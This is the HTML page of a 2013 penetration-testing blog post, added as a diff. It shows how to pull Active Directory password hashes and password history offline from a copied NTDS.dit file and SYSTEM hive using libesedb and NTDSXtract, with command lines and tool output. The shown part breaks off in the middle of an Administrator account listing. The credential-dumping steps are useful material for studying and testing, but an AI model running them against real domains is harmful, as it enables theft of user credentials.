@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2 - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2" />
+<meta property="og:description" content="Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:
+From: http://www.ntdsxtract.com/
+Download: http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+1 wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip From: http://code.google.com/p/libesedb/
+Download: https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+1 wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz Extract the tools:
+1 2 tar zxvf libesedb-alpha-20120102.tar.gz unzip ntdsxtract_v1_0.zip Compile/make libesedb:
+1 2 3 root@wpad:~/blog/# cd libesedb-20120102 root@wpad:~/blog/libesedb-20120102# ./configure root@wpad:~/blog/libesedb-20120102# make Export the tables from NTDS.dit:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 root@wpad:~/blog/libesedb-20120102# cd esedbtools/ root@wpad:~/blog/libesedb-20120102/esedbtools# ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2013-06-11T13:55:21+00:00" />
+<meta property="article:modified_time" content="2013-06-11T13:55:21+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2"/>
+<meta name="twitter:description" content="Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:
+From: http://www.ntdsxtract.com/
+Download: http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+1 wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip From: http://code.google.com/p/libesedb/
+Download: https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+1 wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz Extract the tools:
+1 2 tar zxvf libesedb-alpha-20120102.tar.gz unzip ntdsxtract_v1_0.zip Compile/make libesedb:
+1 2 3 root@wpad:~/blog/# cd libesedb-20120102 root@wpad:~/blog/libesedb-20120102# ./configure root@wpad:~/blog/libesedb-20120102# make Export the tables from NTDS.dit:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 root@wpad:~/blog/libesedb-20120102# cd esedbtools/ root@wpad:~/blog/libesedb-20120102/esedbtools# ."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" /><link rel="prev" href="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" /><link rel="next" href="https://malicious.link/posts/2013/2013-08-10-problems-with-blogging-software/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2013\/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2\/"
+        },"genre": "posts","wordcount":  1163 ,
+        "url": "https:\/\/malicious.link\/posts\/2013\/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2\/","datePublished": "2013-06-11T13:55:21+00:00","dateModified": "2013-06-11T13:55:21+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/shadowcopy/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>shadowcopy</a>&nbsp;<a href="/categories/cracking/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>cracking</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2013-06-11">2013-06-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1163 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:</p>
+<p>From: <a href="http://www.ntdsxtract.com/" target="_blank" rel="noopener noreffer ">http://www.ntdsxtract.com/</a></p>
+<p>Download: <a href="http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip" target="_blank" rel="noopener noreffer ">http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From: <a href="http://code.google.com/p/libesedb/" target="_blank" rel="noopener noreffer ">http://code.google.com/p/libesedb/</a></p>
+<p>Download: <a href="https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz" target="_blank" rel="noopener noreffer ">https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Extract the tools:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar zxvf libesedb-alpha-20120102.tar.gz
+</span></span><span class="line"><span class="cl">unzip ntdsxtract_v1_0.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Compile/make libesedb:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@wpad:~/blog/# <span class="nb">cd</span> libesedb-20120102
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102# ./configure 
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102# make
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Export the tables from NTDS.dit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102# <span class="nb">cd</span> esedbtools/
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
+</span></span><span class="line"><span class="cl">esedbexport <span class="m">20120102</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">Missing <span class="nb">source</span> file.
+</span></span><span class="line"><span class="cl">Use esedbexport to <span class="nb">export</span> items stored in an Extensible Storage Engine <span class="o">(</span>ESE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Database <span class="o">(</span>EDB<span class="o">)</span> file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Usage: esedbexport <span class="o">[</span> -c codepage <span class="o">]</span> <span class="o">[</span> -l logfile <span class="o">]</span> <span class="o">[</span> -m mode <span class="o">]</span> <span class="o">[</span> -t target <span class="o">]</span>
+</span></span><span class="line"><span class="cl">                   <span class="o">[</span> -T table_name <span class="o">]</span> <span class="o">[</span> -hvV <span class="o">]</span> <span class="nb">source</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	source: the <span class="nb">source</span> file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	-c:     codepage of ASCII strings, options: ascii, windows-874,
+</span></span><span class="line"><span class="cl">	        windows-932, windows-936, windows-1250, windows-1251,
+</span></span><span class="line"><span class="cl">	        windows-1252 <span class="o">(</span>default<span class="o">)</span>, windows-1253, windows-1254
+</span></span><span class="line"><span class="cl">	        windows-1255, windows-1256, windows-1257 or windows-1258
+</span></span><span class="line"><span class="cl">	-h:     shows this <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">	-l:     logs information about the exported items
+</span></span><span class="line"><span class="cl">	-m:     <span class="nb">export</span> mode, option: all, tables <span class="o">(</span>default<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	        <span class="s1">&#39;all&#39;</span> exports all the tables or a single specified table with indexes,
+</span></span><span class="line"><span class="cl">	        <span class="s1">&#39;tables&#39;</span> exports all the tables or a single specified table
+</span></span><span class="line"><span class="cl">	-t:     specify the basename of the target directory to <span class="nb">export</span> to
+</span></span><span class="line"><span class="cl">	        <span class="o">(</span>default is the <span class="nb">source</span> filename<span class="o">)</span> esedbexport will add the suffix
+</span></span><span class="line"><span class="cl">	        .export to the basename
+</span></span><span class="line"><span class="cl">	-T:     exports only a specific table
+</span></span><span class="line"><span class="cl">	-v:     verbose output to stderr
+</span></span><span class="line"><span class="cl">	-V:     print version
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102/esedbtools# 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
+</span></span><span class="line"><span class="cl">esedbexport <span class="m">20120102</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Opening file.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">1</span> <span class="o">(</span>MSysObjects<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">2</span> <span class="o">(</span>MSysObjectsShadow<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">3</span> <span class="o">(</span>MSysUnicodeFixupVer2<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">4</span> <span class="o">(</span>datatable<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">5</span> <span class="o">(</span>hiddentable<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">6</span> <span class="o">(</span>link_table<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">7</span> <span class="o">(</span>sdpropcounttable<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">8</span> <span class="o">(</span>sdproptable<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">9</span> <span class="o">(</span>sd_table<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">10</span> <span class="o">(</span>MSysDefrag2<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">11</span> <span class="o">(</span>quota_table<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Exporting table <span class="m">12</span> <span class="o">(</span>quota_rebuild_progress_table<span class="o">)</span> out of 12.
+</span></span><span class="line"><span class="cl">Export completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Move the exported tables to somewhere a bit easier:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102/esedbtools# 
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>NTDS extract can do a lot more than just hashes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@wpad:~/blog# <span class="nb">cd</span> NTDSXtract 1.0/
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/NTDSXtract 1.0# ls
+</span></span><span class="line"><span class="cl">dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
+</span></span><span class="line"><span class="cl">DSUsers
+</span></span><span class="line"><span class="cl">Extracts information related to user objects
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">usage: dsusers.py   <span class="o">[</span>option<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  options:
+</span></span><span class="line"><span class="cl">    --rid 
+</span></span><span class="line"><span class="cl">          List user identified by RID
+</span></span><span class="line"><span class="cl">    --name 
+</span></span><span class="line"><span class="cl">          List user identified by Name
+</span></span><span class="line"><span class="cl">    --passwordhashes 
+</span></span><span class="line"><span class="cl">          Extract password hashes
+</span></span><span class="line"><span class="cl">    --passwordhistory 
+</span></span><span class="line"><span class="cl">          Extract password <span class="nb">history</span>
+</span></span><span class="line"><span class="cl">    --certificates
+</span></span><span class="line"><span class="cl">          Extract certificates
+</span></span><span class="line"><span class="cl">    --supplcreds 
+</span></span><span class="line"><span class="cl">          Extract kerberos keys
+</span></span><span class="line"><span class="cl">    --membership
+</span></span><span class="line"><span class="cl">          List groups of which the user is a member
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/NTDSXtract 1.0# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>But we like hashes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
+</span></span><span class="line"><span class="cl">Running with options:
+</span></span><span class="line"><span class="cl">	Extracting password hashes
+</span></span><span class="line"><span class="cl">	Extracting password <span class="nb">history</span>
+</span></span><span class="line"><span class="cl">Initialising engine...
+</span></span><span class="line"><span class="cl">Scanning database - 100% -&gt; <span class="m">3475</span> records processed
+</span></span><span class="line"><span class="cl">Extracting schema information - 100% -&gt; <span class="m">1549</span> records processed
+</span></span><span class="line"><span class="cl">Extracting object links...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">List of users:
+</span></span><span class="line"><span class="cl"><span class="o">==============</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3562</span>
+</span></span><span class="line"><span class="cl">User name:           Administrator
+</span></span><span class="line"><span class="cl">User principal name: 
+</span></span><span class="line"><span class="cl">SAM Account name:    Administrator
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: 7ceee337-fa58-4ca0-9643-540a40161020
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-500
+</span></span><span class="line"><span class="cl">When created:         2012-08-22 03:12:59
+</span></span><span class="line"><span class="cl">When changed:         2013-05-15 04:06:55
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2012-08-22 02:49:42.899576
+</span></span><span class="line"><span class="cl">Last logon:           2013-05-15 04:08:04.547236
+</span></span><span class="line"><span class="cl">Last logon timestamp: 2013-05-15 04:06:55.577353
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     2013-06-07 02:34:34.560516
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">9</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Account Control:
